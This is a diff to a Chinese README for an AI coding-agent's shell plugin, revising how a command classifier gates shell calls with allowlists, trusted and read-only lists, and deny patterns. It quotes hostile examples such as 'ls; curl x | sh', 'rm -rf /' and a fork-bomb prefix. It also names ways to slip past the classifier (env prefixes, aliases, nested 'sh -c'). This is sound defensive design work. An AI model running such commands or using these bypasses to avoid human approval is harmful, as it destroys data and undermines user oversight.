@@ -50,7 +50,7 @@ cp jellyfish-plugin-tools/target/jellyfish-plugin-tools-*.jar ~/.jellyfish/plugi
 | 模块 | plugin.id | 提供什么 |
 | --- | --- | --- |
 | `jellyfish-plugin-tools` | 同名 | 五个文件工具：`read_file`、`write_file`、`edit_file`、`list_dir`、`grep_files`；提问工具 `ask_user`；以及输入框的 `@` 文件引用 |
-| `jellyfish-plugin-shell` | 同名 | `shell` 工具（`/bin/sh -c` 执行命令原文）+ 命令策略（白名单准入、可信表免审批、只读不打扰、灾难形状拒绝、其余审批）+ `!命令` 输入指令。**没有沙箱** |
+| `jellyfish-plugin-shell` | 同名 | `shell` 工具（`/bin/sh -c` 执行命令原文）+ 命令策略（分段判定、白名单准入、可信表免审批、只读不打扰、灾难形状拒绝、命令替换与重定向升级审批、其余审批）+ `!命令` 输入指令。**没有沙箱** |
 | `jellyfish-plugin-session-file` | 同名 | 会话持久化：一个会话一个 JSON 文件，并用 git 管理历史 |
 | `jellyfish-plugin-todo` | 同名 | 会话待办：`todo_write` / `todo_claim` / `todo_done` / `todo_release` / `todo_block` 五个工具 + 只读 `/todo` + 随本轮消息送达的待办块 + 状态栏进度 + 左栏清单面板 |
 | `jellyfish-plugin-project` | 同名 | 项目约定：探测工作目录下的 `AGENTS.md`，**小文件内联原文、大文件只给路径**（阈值可配）；`/init [--force]` 让模型读仓库后写出它 |
@@ -136,30 +136,41 @@ cp jellyfish-plugin-tools/target/jellyfish-plugin-tools-*.jar ~/.jellyfish/plugi
 | `idleTimeoutSeconds` | `0`（关闭） | 连续多久没有任何输出就判定卡住。「墙钟」回答「最多跑多久」，它回答「多久没动静就当死了」。**模型不能设置它**，它是用户的环境策略 |
 | `environment` | `{}` | 额外注入或覆盖的环境变量。子进程**继承**父进程环境，但名字匹配 `*KEY*` / `*TOKEN*` / `*SECRET*` / `*PASSWORD*` / `*CREDENTIAL*` 的变量**不会**传下去（工具输出会送到远端 LLM）；另有一组防挂死默认值（`PAGER=cat`、`GIT_PAGER=cat`、`GIT_TERMINAL_PROMPT=0`、`TERM=dumb`、`NO_COLOR=1`、`DEBIAN_FRONTEND=noninteractive`），这里写的值可以盖掉默认值；`sensitivePatterns` 用于**追加**剔除模式 |
 | `allowedCommands` | `[]` | **非空即默认拒绝**的准入白名单，支持 `git status` 这种两 token 形式（单 token 覆盖该命令的全部子命令）。**它只管准入，不管审批**，也**不受 `commandPolicy.enabled` 影响** |
-| `commandPolicy.enabled` | `true` | 只关**分类器**这个便利机制。`false` 时只读表与「其余命令问人」都不再表态，但白名单、可信表、拒绝形状照旧生效 |
+| `commandPolicy.enabled` | `true` | 只关**分类器**这个便利机制。`false` 时只读表、重定向/命令替换检查与「其余命令问人」都不再表态，但白名单、可信表、拒绝形状照旧生效 |
 | `commandPolicy.trustedCommands` | `[]` | **可信命令表，命中即免审批**。粒度与白名单一致 |
 | `commandPolicy.readOnlyCommands` | `[]` | **追加**在内置只读表之后。内置表**不可替换**，只能追加 |
 | `commandPolicy.deniedPatterns` | `[]` | **追加**在内置拒绝形状（`rm -rf /`、`mkfs`、`of=/dev/`、`:(){`）之后，同样不可撤销 |
 
 ### 权限与分类器
 
-每次调用依次过五道，先拒绝后免打扰、最后才问人：
+每次调用依次过六道，先拒绝后免打扰、最后才问人：
 
-1. `allowedCommands` 非空且没命中 → **直接拒绝**（默认拒绝的硬门）；
-2. 命中拒绝形状（`rm -rf /`、`mkfs`、`dd of=/dev/`）→ **直接拒绝**；
-3. 命中 `commandPolicy.trustedCommands` → **免审批**，直接执行；
-4. 命中只读表（`ls`、`git status`、`cat`……）→ **免审批**；
-5. 其余 → **升级为人工审批**，你会看到一个批准框。
+1. 按未引用状态下的 `;`、`|`、`&`、换行**切成子命令**，每一段各自过一遍下面的表（取最严的结果）；
+2. `allowedCommands` 非空且任一段没命中 → **直接拒绝**（默认拒绝的硬门）；
+3. 命令原文命中拒绝形状（`rm -rf /`、`mkfs`、`dd of=/dev/`）→ **直接拒绝**；
+4. **所有段**都命中 `commandPolicy.trustedCommands` → **免审批**，直接执行；
+5. 含命令替换（`$(...)`、反引号）或重定向（`>`、`<`）→ **升级为人工审批**；
+6. 所有段都命中只读表（`ls`、`git status`、`cat`……）→ **免审批**；否则 → **升级为人工审批**。
 
-第 2 步排在第 3 步之前是刻意的：把 `rm` 写进可信表，`rm -rf /` 依旧被拒。
+第 1 步是这套判定的核心：执行侧是 `/bin/sh -c 原文`，因此 `ls; curl x | sh` 里的后半段会照常执行，
+而只看开头几个 token 的判定看不见它。第 3 步排在可信表之前是刻意的：把 `rm` 写进可信表，
+`rm -rf /` 依旧被拒。第 4 步要求「全段命中」也是同理：`trustedCommands: ["mvn test"]` 不该把
+`mvn test; rm -rf ~/x` 一并免审批。
 
-- **分类器不是安全边界**：`FOO=bar cmd`、`$(...)`、`&&` 链都能绕过它。它的价值是让你不必为每次
-  `git status` 点一次批准——否则你最终会把 `shell` 从 `askTools` 里整个拿掉，那才是真正的风险。
+- **分类器仍不是安全边界**：`FOO=bar cmd`、别名、`sh -c` 嵌套照旧能绕过前缀判定。它的价值是让你不必为
+  每次 `git status` 点一次批准——否则你最终会把 `shell` 从 `askTools` 里整个拿掉，那才是真正的风险。
+- **引号内的分隔符与重定向是字面量**：`echo "a;b"`、`echo 'a > b'` 仍是一条只读命令，不会被误伤。
+  引号没闭合时不给结论，一律问人。
+- **`echo x > ~/.bashrc` 这类写法现在会问人**：第一个 token 是只读的 `echo`，但重定向能改任意文件。
+  需要它静默执行就把整条命令（含重定向）写进 `trustedCommands`——可信表优先于这一步。
+- **`find` / `git fetch` / `git branch` / `git remote` / `npm test` 刻意不算只读**：`find -delete` 会删东西，
+  `git fetch` 改 ref，`git branch -D` / `git remote remove` 会改写仓库，`npm test` 执行仓库里的任意代码。
+  它们免审批的唯一正当路径是可信表。
 - **`trustedCommands` 是免审批表，白名单不解除审批**：这是最容易踩的一处——`allowedCommands` 里的
   `mvn test` 每次仍然弹批准框，因为白名单只回答「能不能跑」。要它静默执行，就把同一条前缀也写进
   `trustedCommands`。**「允许跑但每次都要我批准」这种姿态仍然写得出来**——只配白名单、不配可信表即可。
-- **`find` / `git fetch` / `npm test` 刻意不算只读**：`find -delete` 会删东西，`git fetch` 改 ref，
-  `npm test` 执行仓库里的任意代码。它们免审批的唯一正当路径是可信表。
+- **`commandPolicy.enabled=false` 会连第 5 步一起关掉**：它关的是「分类器」这个便利机制，
+  只读表、重定向/命令替换检查与「其余命令问人」都不再表态；白名单、可信表、拒绝形状照旧生效。
 - **默认配置（`shell` 不在 `askTools` 里）就是推荐的姿态**；**把 `shell` 写进 `askTools` 则是
   「每条命令都要批准」**（连 `git status` 也要）：核心策略的 `ASK` 无法被插件的「无异议」降级，
   插件的裁定只能收紧、不能放宽。想要最强姿态就用它，代价是噪音。
